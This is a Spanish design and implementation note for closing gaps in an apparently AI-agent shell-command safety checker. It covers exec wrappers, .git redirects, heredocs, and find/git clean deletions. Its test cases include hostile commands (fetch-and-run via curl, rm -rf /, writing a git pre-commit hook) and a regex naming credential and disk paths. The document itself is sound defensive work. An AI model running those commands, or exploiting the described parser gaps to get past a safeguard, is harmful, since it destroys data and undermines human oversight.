# D2 (propuesta, L1) — Cerrar los huecos de `bash-parser` encontrados por D1

- **Estado**: ✅ IMPLEMENTADO por el mantenedor 2026-11-11 (OK «sí a todo» del dueño): G4 (`exec` wrapper), G1 (`.git` en redirecciones), G3 (`find -delete`/`-exec rm`/`-execdir rm`, `git clean` con `-f` sin `-n` → ask), G2 (heredoc: cuerpos extraídos antes de segmentar; ante delimitador no encontrado → fallback conservador previo; D1 heredoc tests invertidos a verificación; fuzz ampliado).
- **Ampliación 2026-11-12**: G1-bis (cadenas relativas `sub/…/.git/…`, `../repo/…`) y G1-ter (absolutas multi-segmento `/home/u/.ssh/…`) fusionadas. Precisión 2026-11-12: `-exec` detecta el PRIMER token tras él con basename (`-exec echo rm` NO dispara; antes sobre-preguntaba); `.git` exige `/` o fin de ruta (`.git-ok` no dispara). Suite verde en master.
- **Relación**: tests adversariales ya congelan el estado actual en
  `tests/bash-parser-adversarial.test.ts` («congelar ≠ bendecir»). D2 los invierte.
- **Riesgo**: ALTO por diseño — toca dos piezas del camino de seguridad. Spec antes que
  todo; tests obligatorios antes de merge; fuzz de shell-scan obligatorio.
- **Orden estricto de los cambios**: G4 → G1 → G2 → (G3 requiere OK explícito).

## G4 — `exec` como wrapper (mecánico, riesgo bajo)
- Añadir `"exec"` a `WRAPPERS` en `src/tools/bash-parser.ts`.
- Tests esperados (ya en D1, cambian de caracterización a verificación):
  `exec rm -rf x` → **true**; `exec bash -c "$(curl -s https://x)"` → **true** (regla 2b tras unwrap).
- Invariante: solo se añade el wrapper; ningún cambio de semántica de destructivos.

## G1 — `.git` en `REDIRECT_SENSITIVE`
- Regex actual: `\.ssh\b|\.aws\b|\.gnupg\b|etc\b|dev/(sd|nvme|hd|mmcblk)|boot\b`.
- Añadir `\.git\b` (consistente con el bloqueo duro `.git` de `src/security/paths.ts`,
  que ya aplica a tools de archivo — esto lo extiende a redirecciones **bash**).
- Tests: `echo x > .git/hooks/pre-commit` → **true**; `echo x > ./.git/config` → **true**;
  `git status > normal.txt` → **false** (no hay redir a `.git`).
- No ampliar a otros nombres sin OK (p. ej. `.env` queda filtrado por permisos/deny; no toca acá).

## G2 — Heredocs como cuerpo NO ejecutado (el hueco estructural)
- Problema actual (verificado en D1): ante cualquier `<<`, `shellSegments` devuelve el
  comando entero como UN segmento → `cat <<EOF\nrm -rf /\nEOF` da cmd=cat → **false**.
  Falso negativo CONFIRMADO.
- Enfoque: en `src/core/shell-scan.ts`, antes de partir, extraer heredocs:
  detectar `<<[-]?\s*'?(\w+)'?`, localizar el cuerpo hasta la línea que == delimitador,
  eliminarlo del texto de segmentación (los cuerpos heredoc NO son comandos), y procesar
  el RESTO normalmente. El cuerpo se ignora para la ejecución (correcto POSIX) pero su
  presencia no debe ocultar comandos OUTSIDE del heredoc ni los `&&` previos.
- Precauciones: delimitador con pipes/números raros; heredoc dentro de heredoc no soportado
  → fallback CONSERVADOR = comportamiento actual (string entero como segmento). Comillas
  en el cuerpo no aplican (no se analiza).
- Fuzz: seeds 42/7/1234/99/2026/31337/2718 (ya usados en `tests/fuzz-parsers.test.ts`),
  nunca lanza; toda anomalía → comportamiento previo.
- Inventario de cambios esperado: `src/core/shell-scan.ts` (extracción), tests nuevos,
  D1 tests pasan de caracterización a verificación en los 4 casos heredoc.
- Este cambio **requiere** que la suite siga verde en `tests/permissions.test.ts` e
  `tests/security-paths.test.ts` íntegras.

## G3 — Detectar `find -delete` y `git clean` destructor (decisión de producto)
- A) `find` con `-delete` → análisis propio: segmento que empieza con `find` y contiene
  `-delete` o `-exec rm`/`-execdir rm` → forzado ask (reason «find con -delete/-exec rm»).
- B) `git clean` con `-f\w*` que borra ~todo: `-fd`, `-fdx`, `-fdxn`? NO — `-n` es simulación
  (nunca forzado). Solo `-f` presente y sin `-n` → forzado ask.
- Ambos ensanchan ask = más fricción: **necesitan OK explícito del dueño** antes de mergear
  (son falsos-positivos deliberados del mismo tipo que `rm`).

## No-objetivos

- Cero cambios a la semántica de `ask` ganado a allow (eso es invariante, no D2).
- Cero POSIX parser; cero análisis de quoting fuera del alcance existente.
- Cero toques a `src/security/*` ni `src/core/permissions.ts`.

## Criterio de hecho

G4+G1: PRs independientes y pequeños, cada uno con tests invertidos desde D1; suite verde.
G2: PR con estrategia de fallback documentada + fuzz ampliado + suite completa verde.
G3: solo con OK explícito del dueño; mismo shape que G4/G1.
